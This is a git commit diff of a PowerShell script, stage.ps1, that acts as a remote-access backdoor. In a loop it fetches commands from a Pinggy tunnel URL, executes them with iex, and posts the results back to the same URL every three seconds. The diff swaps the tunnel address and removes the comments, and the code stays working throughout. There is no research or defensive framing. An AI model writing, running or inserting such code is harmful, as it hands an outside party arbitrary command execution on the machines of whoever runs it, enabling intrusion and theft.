a2d2f4f1354f401146b0a54685231de0b759b189
youtube.com <161937183+fieropapagayo@users.noreply.github.com>
2026-04-14 00:01:34 +0200

    Update stage.ps1

--- stage.ps1
+++ stage.ps1
@@ -1,24 +1,13 @@
-# URL de tu túnel Pinggy
-$u = 'https://cmzaw-84-126-116-174.run.pinggy-free.link'
+$u = 'https://lfynh-84-126-116-174.run.pinggy-free.link'
+$headers = @{"X-Pinggy-No-Screen" = "true"}
 
-# Headers para evitar la advertencia de Pinggy y que funcione como API
-$headers = @{
-    "X-Pinggy-No-Screen" = "true"
-    "User-Agent" = "PinggyAPIClient/1.0"
-}
-
-while($true) {
+while ($true) {
     try {
-        # Obtener comando (GET)
         $c = (Invoke-WebRequest -Uri $u -Headers $headers -UseBasicParsing).Content
-        
         if ($c -and $c -ne 'OK') {
-            # Ejecutar comando y enviar resultado (POST)
             $r = iex $c 2>&1 | Out-String
             Invoke-WebRequest -Uri $u -Method POST -Body $r -Headers $headers -UseBasicParsing
         }
-    } catch {
-        # Si hay error, esperamos un poco para no saturar
-    }
+    } catch {}
     Start-Sleep -Seconds 3
 }
